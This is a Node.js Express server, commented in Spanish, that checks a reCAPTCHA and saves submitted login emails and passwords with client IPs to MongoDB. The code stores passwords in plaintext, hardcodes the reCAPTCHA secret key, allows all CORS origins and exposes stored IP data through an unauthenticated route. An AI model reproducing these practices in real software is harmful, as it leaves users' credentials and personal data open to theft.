const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const axios = require('axios');
const path = require('path');
const cors = require('cors');

const app = express();
const port = 3001;  // Asegúrate de usar el puerto correcto

// Configuración de cors
app.use(cors());

// Configuración de bodyParser para manejar las solicitudes JSON
app.use(bodyParser.json());

// Servir archivos estáticos
app.use(express.static(path.join(__dirname, 'public')));

// Conexión a MongoDB
mongoose.connect('mongodb://localhost:27017/Login', {
    useNewUrlParser: true,
    useUnifiedTopology: true,
});

// Actualizar el esquema del usuario para incluir la IP y otros campos
const userSchema = new mongoose.Schema({
    email: String,
    password: String,
    ip: String, 
    macId: String,
    captchaAttempts: Number, 
    date: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Ruta para recibir los datos del formulario
app.post('/submit', async (req, res) => {
    const { user, password, 'g-recaptcha-response': recaptchaResponse } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    const macId = '00:0a:95:9d:68:16'; 
    const captchaAttempts = 1; 
    const secretKey = '6LeD4h4qAAAAALJx-ed5cDI68FBuQqt5OYzE5-RP';  
    const verificationURL = `https://www.google.com/recaptcha/api/siteverify?secret=${secretKey}&response=${recaptchaResponse}`;

    try {
        const response = await axios.post(verificationURL);
        const data = response.data;

        console.log('CAPTCHA verification response:', data); 

        if (!data.success) {
            return res.status(400).json({ message: 'Captcha verification failed' });
        }

        const newUser = new User({
            email: user,
            password: password,
            ip: clientIp,
            macId: macId,
            captchaAttempts: captchaAttempts
        });
        await newUser.save();

        res.status(200).json({
            message: 'Data saved successfully',
            ip: clientIp,
            macId: macId,
            captchaAttempts: captchaAttempts,
            date: newUser.date
        });
    } catch (error) {
        console.error('Error in /submit:', error);
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// Ruta para obtener los datos del usuario
app.get('/user-data', async (req, res) => {
    try {
        const users = await User.find().sort({ _id: -1 }).limit(1);
        if (users.length === 0) {
            return res.status(404).json({ message: 'No data found' });
        }
        const user = users[0];
        console.log('Fetched user data:', user); 
        res.status(200).json({
            ip: user.ip,
            macId: user.macId,
            captchaAttempts: user.captchaAttempts,
            date: user.date
        });
    } catch (error) {
        console.error('Error fetching user data:', error);
        res.status(500).json({ message: 'Server error', error: error.message });
    }
});

// Ruta para servir la página de éxito
app.get('/tabla.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'tabla.html'));  
});

// Iniciar el servidor
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
